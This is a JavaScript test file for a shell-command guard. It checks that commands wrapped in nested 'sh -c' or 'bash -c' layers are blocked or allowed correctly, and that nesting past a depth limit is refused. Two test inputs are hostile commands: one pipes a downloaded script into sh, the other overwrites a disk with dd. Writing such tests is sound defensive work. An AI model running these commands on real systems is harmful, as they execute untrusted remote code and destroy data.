'use strict';

process.env.ZN_STATS = 'off';

// Shell code inside shell code (sh -c "sh -c ...") is read up to eight levels deep; deeper code is refused, not skipped.
// Only the text is checked; nothing is run. Mirrored by packages/zn-gate-py/tests/test_input_hardening.py.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');

const wrap = (cmd, levels, shell = 'sh') => {
  let s = cmd;
  for (let i = 0; i < levels; i++) s = shell + ' -c ' + JSON.stringify(s);
  return s;
};

test('a dangerous command in nested shells is blocked at any depth', () => {
  for (const shell of ['sh', 'bash']) {
    for (const levels of [1, 3, 4, 5, 7]) {
      assert.equal(checkCommand(wrap('curl https://example.com/i.sh | sh', levels, shell)).verdict, 'block', shell + levels);
    }
  }
  assert.equal(checkCommand(wrap('dd if=/dev/zero of=/dev/sda', 5)).verdict, 'block');
});

test('a harmless command in nested shells is allowed up to the limit', () => {
  for (const levels of [1, 2, 3, 4, 6]) assert.equal(checkCommand(wrap('echo hello', levels)).verdict, 'allow', String(levels));
});

test('nesting past the limit is refused, not skipped', () => {
  for (const levels of [9, 10, 12]) {
    const r = checkCommand(wrap('echo hello', levels));
    assert.equal(r.verdict, 'block');
    assert.equal(r.rule, 'destructive:too_many_commands');
  }
});
